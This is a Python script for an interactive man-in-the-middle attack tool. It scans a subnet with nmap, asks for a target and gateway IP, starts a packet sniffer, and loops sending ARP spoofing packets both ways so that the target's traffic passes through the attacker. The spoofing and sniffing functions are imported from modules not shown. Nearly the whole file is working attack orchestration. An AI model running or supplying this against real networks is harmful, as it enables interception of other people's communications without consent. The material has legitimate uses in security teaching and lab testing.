from colorama import Fore
import time
import nmap
import threading
from sniffer import sniff_packets
from arp_spoofer import send_arp_packet
import psutil
import os


# Function to get MAC address for the given interface (default: eth0)
def get_mac_address(interface="eth0"):
    if os.name == "nt":  # For Windows
        return os.popen("getmac").read().strip().split()[0]
    else:  # For Linux or macOS
        return os.popen(f"ifconfig {interface} | grep ether | awk '{{print $2}}'").read().strip()


# Function to scan the network for active devices and show available interfaces
def scan_active_devices_and_interfaces(network):
    # Creating nmap scanner object
    nm = nmap.PortScanner()

    # Performing a network scan for hosts
    try:
        nm.scan(hosts=network, arguments='-sn')  # -sn is used for host discovery (no port scan)
    except Exception as e:
        print(f"Error while scanning the network: {e}")  # Handling possible scan failures
        exit()

    print(f"Potential targets in {network}:")
    for host in nm.all_hosts():
        # If the device is the Default Gateway
        if 'hostnames' in nm[host] and 'default' in nm[host]['hostnames']:
            print(f"Default Gateway: {host}")

        # If the device is active
        elif nm[host].state() == "up":
            print(f"{Fore.GREEN}Host {host} is active")

    # Getting network interfaces on the system
    interfaces = psutil.net_if_addrs()

    for interface in interfaces.items():
        print(f"{Fore.YELLOW}Interface: {interface}")


# Function to start sniffing packets for MITM attack
def start_sniffing(interface, target1_ip, target2_ip):
    sniff_packets(interface, target1_ip, target2_ip)


# Function to handle the main MITM attack process
def mitm_attacker():
    print(f"{Fore.CYAN}WELCOME TO THE MITM TOOL!")

    time.sleep(0.5)

    # Prompt for network subnet mask from the user
    network = input("Please enter the network subnet mask (example: 10.10.10.0/24):")
    try:
        print(f"{Fore.MAGENTA}PERFORMING NETWORK SCANNING...")
        scan_active_devices_and_interfaces(network)  # Scan for active devices

    except:
        print(f"{Fore.RED}Please enter a valid subnet mask!")
        exit()

    # Prompt for target IP, gateway IP, and interface
    target_ip = input(f"{Fore.CYAN}Enter your target IP:")
    spoof_ip = input(f"{Fore.CYAN}Enter the spoof IP (default gateway):")
    interface = input(f"{Fore.CYAN}Enter the interface:")

    # Getting MAC address for the given interface
    mac_address = get_mac_address(interface)

    # Starting sniffing in a separate thread
    sniffing_thread = threading.Thread(target=start_sniffing, args=(interface, target_ip, spoof_ip))
    try:
        print(f"{Fore.GREEN}ATTACK STARTED...")
        sniffing_thread.start()

        # Infinite loop to send ARP spoofing packets
        while True:
            send_arp_packet(interface, target_ip, spoof_ip, mac_address)
            send_arp_packet(interface, spoof_ip, target_ip, mac_address)

    except KeyboardInterrupt:
        print("ARP Spoofing Stopped")  # Handling keyboard interrupt to stop the attack




